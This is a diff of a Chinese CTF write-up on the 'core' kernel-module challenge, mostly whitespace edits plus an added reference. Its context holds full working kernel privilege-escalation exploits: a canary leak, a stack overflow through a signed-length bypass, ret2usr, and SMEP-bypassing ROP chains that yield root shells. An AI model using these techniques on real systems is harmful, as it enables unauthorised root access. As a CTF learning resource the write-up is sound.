@@ -48,8 +48,6 @@ cpio -idmv <../core.cpio
 find .|cpio -o -H newc >../new_rootfs.cpio
 ```
 
-
-
 修改后的init脚本：
 
 ```bash
@@ -123,7 +121,6 @@ drwxrwxr-x    2 chal     chal             0 Apr 21 13:32 tmp
 drwxrwxr-x    4 chal     chal             0 Apr 21 13:18 usr
 -rwxrwxr-x    1 chal     chal      48134320 Apr 21 13:18 vmlinux
 / $ 
-
 ```
 
 分析core.ko
@@ -159,8 +156,8 @@ proc_create函数原型如下：
 
 ```c
 struct proc_dir_entry *proc_create(const char *name, umode_t mode,
-				   struct proc_dir_entry *parent,
-				   const struct proc_ops *proc_ops)
+                   struct proc_dir_entry *parent,
+                   const struct proc_ops *proc_ops)
 ```
 
 根据分析proc_ops中定义函数只有3个：core_write、core_ioctl和offset core_release
@@ -205,8 +202,6 @@ __int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
 
 * 命令0x6677889A触发core_copy_func操作
 
-
-
 在分析core_read函数：
 
 ```c
@@ -237,8 +232,6 @@ unsigned __int64 __fastcall core_read(__int64 a1)
 ```
 
 代码copy_to_usr(a1,&v5[off],64)可用于进行canary泄露，因为off是外部可控制的
-
-
 
 在分析core_write函数：
 
@@ -273,8 +266,6 @@ __int64 __fastcall core_copy_func(__int64 a1)
 
 这里是有符号跳转，但是a1在qmemcpy函数中，被转换位unsigned _int16，因此这里可以通过负数绕过大小限制，导致通过v2实现栈溢出。
 
-
-
 那么name是否可以被外部控制？
 
 查询name的xref，发现name在core_write函数中被赋值：
@@ -303,8 +294,6 @@ __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
 * 通过ioctrl调用core_copy_func函数，让其栈溢出，完成漏洞利用。
 
 * 在用户空间，执行system('/bin/sh')得到root shell
-
-
 
 ## 3.漏洞利用
 
@@ -351,11 +340,11 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0xffffffffa00b6549    pop    rax
    0xffffffffa00b654a    test   ah, 2
    0xffffffffa00b654d    je     0xffffffffa00b65e5 <0xffffffffa00b65e5>
- 
+
    0xffffffffa00b6553    call   0xffffffffa00d4720 <0xffffffffa00d4720>
- 
+
    0xffffffffa00b6558    call   0xffffffffa00b6430 <0xffffffffa00b6430>
- 
+
    0xffffffffa00b655d    mov    rax, qword ptr [rbx]
    0xffffffffa00b6560    test   al, 8
 ─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────
@@ -378,7 +367,6 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 pwndbg> 
  ()
-
 ```
 
 但是为了能够给core_read，core_write或者core_copy_func函数下断点，我们还行设置下init脚本，让其再install core.ko后，将内核的符号打印到/tmp目录下，修改的脚本如下：
@@ -480,8 +468,6 @@ poweroff -d 0  -f
 
 promote_root为执行commit_creds(prepare_kernel_cred(0))的wraper函数。
 
-
-
 promote_root的代码如下：
 
 ```c
@@ -574,7 +560,7 @@ void promote_root()
     commit_cred = commit_cred_addr;
     prepare_kernel_cred =  prepare_kernel_cred_addr;
     (*commit_cred)((*prepare_kernel_cred)(0));
-    
+
     asm("mov %rbp,%rsp");    //修复栈帧
     asm("pop %rbp"); //弹出rbp
     asm("mov %0,%%rax;\
@@ -582,7 +568,7 @@ void promote_root()
         :
         :"r"(ret_addr)
         :"%rax");
-    
+
 }
 ```
 
@@ -591,8 +577,6 @@ void promote_root()
 第二步：将栈上的rbp弹出
 
 第三步：直接跳转到ret_addr执行（0x:00000000000001B），此时暂时只有|--rip(ioctl)--|--rbx(ioctl)--|
-
-
 
 执行效果如下：
 
@@ -607,7 +591,6 @@ name_payload_len:88
 / # id
 uid=0(root) gid=0(root)
 / # 
-
 ```
 
 完整的poc如下：
@@ -633,7 +616,7 @@ void promote_root()
     commit_cred = commit_cred_addr;
     prepare_kernel_cred =  prepare_kernel_cred_addr;
     (*commit_cred)((*prepare_kernel_cred)(0));
-    
+
     asm("mov %rbp,%rsp");    //修复栈帧
     asm("pop %rbp");
     asm("mov %0,%%rax;\
@@ -641,7 +624,7 @@ void promote_root()
         :
         :"r"(ret_addr)
         :"%rax");
-    
+
 }
 
 unsigned long long get_kernel_func_addr(char* cmd)
@@ -682,7 +665,7 @@ int main(int argc,char ** argv)
     for (int i=0;i<64;i++)
     {
         printf("%016llx ",buf[i]);
-    
+
     }
     printf("\n");
     unsigned long long canary = buf[0];
@@ -696,7 +679,7 @@ int main(int argc,char ** argv)
     printf("commit_cred:%016llx\n",commit_cred_addr);
     printf("prepare_kernel_cred:%016llx\n",prepare_kernel_cred_addr);
     //promote_root(commit_cred_addr,prepare_kernel_cred_addr);
-    
+
     unsigned long long name_payload[11];
     memset(name_payload,0x90,sizeof(name_payload));
     name_payload[8] = canary;//canary
@@ -705,7 +688,7 @@ int main(int argc,char ** argv)
     printf("name_payload_len:%u\n",sizeof(name_payload));
     //set name
     write(fd,name_payload,sizeof(name_payload));
-    
+
     //triger stack mash and excute shellcode to promote to root
     long long len = -65448;//unsigned short len =88
     ioctl(fd,core_copy_func_cmd,len);
@@ -715,20 +698,15 @@ int main(int argc,char ** argv)
 
     return 0;
 }
-
 ```
 
 需要注意：promote_root函数一定不能有参数，因为是直接jmp到该函数执行的，没有进行参数准备的操作。
-
-
 
 方式2：传递给name变量用于覆盖ret_address的值地址不是promote_root函数的地址，而是从mov %rbp，%rsp开始执行，那么执行后的栈空间布局如下：
 
 > |--rip(ioctl)--|--rbx(ioctl)--|--size=0x10--|
 
 最后只需要mov %rsp,%rbp,然后正常执行leave和retn指令即可
-
-
 
 promote_root代码：
 
@@ -764,9 +742,6 @@ name设置 ：
 
 > .text:00000000000012A9 F3 0F 1E FA                 endbr64
 > .text:00000000000012AD 55                          push    rbp
-> 
-
-
 
 PS：失败了，不知道什么原因，最终会报错(后面在check下）：
 
@@ -817,13 +792,9 @@ name_payload_len:88
 
 不确定是不是因为rbp不对导致的？？？
 
-
-
 方式3：传递给name变量用于覆盖ret_address的值地址还是promote_root函数的地址，为了平衡栈，我们需要多增加新增一个新的pop操作，当然mov %rsp,%rbp要优先执行：
 
 > |--rip(ioctl)--|--rbx(ioctl)--|---rbp---|--size=0x10--|
-
-
 
 promote_root代码：
 
@@ -848,8 +819,6 @@ name和设置和1保持一致。
 
 （和方式2会产生相同的问题，不确定是不是因为rbp不对导致的？？？）
 
-
-
 ## 4. SMEP和SMAP是能时？
 
 ### 4.1. rop绕过SMEP
@@ -866,7 +835,6 @@ qemu-system-x86_64 \
 -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
 -cpu qemu64,smep,smap \
 -nographic  \
-
 ```
 
 从新执行exp，发现exploit被SMEP拦截：
@@ -958,8 +926,6 @@ name_payload_len:88
 > 
 > gadget_addr =  kernel_base+gadget_addr_offset
 
-
-
 攻击思路如下：
 
 * 将0 赋值到rdi
@@ -1006,7 +972,6 @@ structures).
 3）SWAPGS is intended for use with fast system calls when in 64-bit 
 mode to allow immediate access to kernel structures on transition to 
 kernel mode.
-
 ```
 
 ### 4.2 rop gadgets
@@ -1038,8 +1003,6 @@ commit_cred函数的准备参数的gadget很多，如
 > 0xffffffff81735dc1 : pop r15 ; mov rdi, rax ; jmp rdx
 > 
 > 0xffffffff810a0f49 : pop rdx ; ret
-
-
 
 rop如下：
 
@@ -1091,14 +1054,9 @@ void save_status()
     printf("user_rsp:0x%016llx\n", user_rsp);
     printf("user_flag:0x%016llx\n", user_flag);
 }
-
 ```
 
-
-
 ### 4.3.执行结果
-
-
 
 完整的pop如下：
 
@@ -1218,7 +1176,7 @@ int main(int argc, char **argv)
     save_status();
     build_rop(canary);
     // set name
-    
+
     write(fd, name_payload, sizeof(name_payload));
 
     // triger stack mash and excute shellcode to promote to root
@@ -1227,10 +1185,7 @@ int main(int argc, char **argv)
 
     return 0;
 }
-
 ```
-
-
 
 执行结果如下：
 
@@ -1242,7 +1197,7 @@ SeaBIOS (version 1.13.0-1ubuntu1)
 
 
 iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+1FF8C8B0+1FECC8B0 CA00
-                                                                               
+
 
 
 Booting from ROM...
@@ -1268,10 +1223,7 @@ uid=0(root) gid=0(root)
 / # whoami
 root
 / # 
-
 ```
-
-
 
 ### 4.4.工具使用：
 
@@ -1292,8 +1244,6 @@ ropper安装
 
 PS: 未安装keystone-engine，会导致报错 module 'keystone' has no attribute 'KS_ARCH_X86'
 
-
-
 也可以使用ROPgadget获得gadget，但是获取的信息好像没办法识别iret
 
 > ROPgadget --binary ./vmlinux_out > gadget.txt
@@ -1313,12 +1263,9 @@ ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player$ cat gadget_ro
 0xffffffff81050abc: push rax; push -0x7efaf53c; iretq; ret; 
 0xffffffff81050ac2: iretq; ret; 
 0xffffffff81050ab9: pushfq; mov eax, cs; push rax; push -0x7efaf53c; iretq; ret; 
-
 ```
 
 _Note:不确定上面的现象是不是普遍现象._
-
-
 
 ## 5. 遗留问题
 
@@ -1328,9 +1275,13 @@ _Note:不确定上面的现象是不是普遍现象._
 
 * 为什么最后一定要通过iret来进行跳转？
 
-
-
 ## 6. 附录
+
+参考：
+
+1.[ctf中 linux 内核态的漏洞挖掘与利用系列] https://www.anquanke.com/post/id/270917
+
+2.其他参考
 
 intel跳转指令：
 
@@ -1367,5 +1318,3 @@ intel跳转指令：
 > JNP ;奇偶位清除则跳转
 > JPE ;奇偶位相等则跳转
 > JPO ;奇偶位不等则跳转
-
-
